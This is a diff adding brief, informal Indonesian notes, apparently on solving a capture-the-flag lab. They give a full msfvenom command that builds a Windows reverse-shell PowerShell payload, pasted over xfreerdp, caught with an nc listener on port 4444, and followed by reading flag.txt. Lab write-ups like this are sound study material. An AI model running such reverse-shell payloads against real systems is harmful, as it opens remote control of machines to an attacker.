@@ -1,0 +1,7 @@
+1. run msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ipmu LPORT=1111 -f powershell
+2. copas enakan dari xfreerdp -> dari machine lag bet gilak -> copas nya 1 1
+3. dari atas dulu enter -> terus hex payload nya enter -> abis itu yang akhir enter
+4. harus port 4444 jir lport nya gila amat
+5. biar dapet flag gitu -> nyalain nc jangan lupa di 4444
+6. flag di /desktop -> nah gabisa di cat sama di  Get-Content -> pake type -> type flag.txt
+
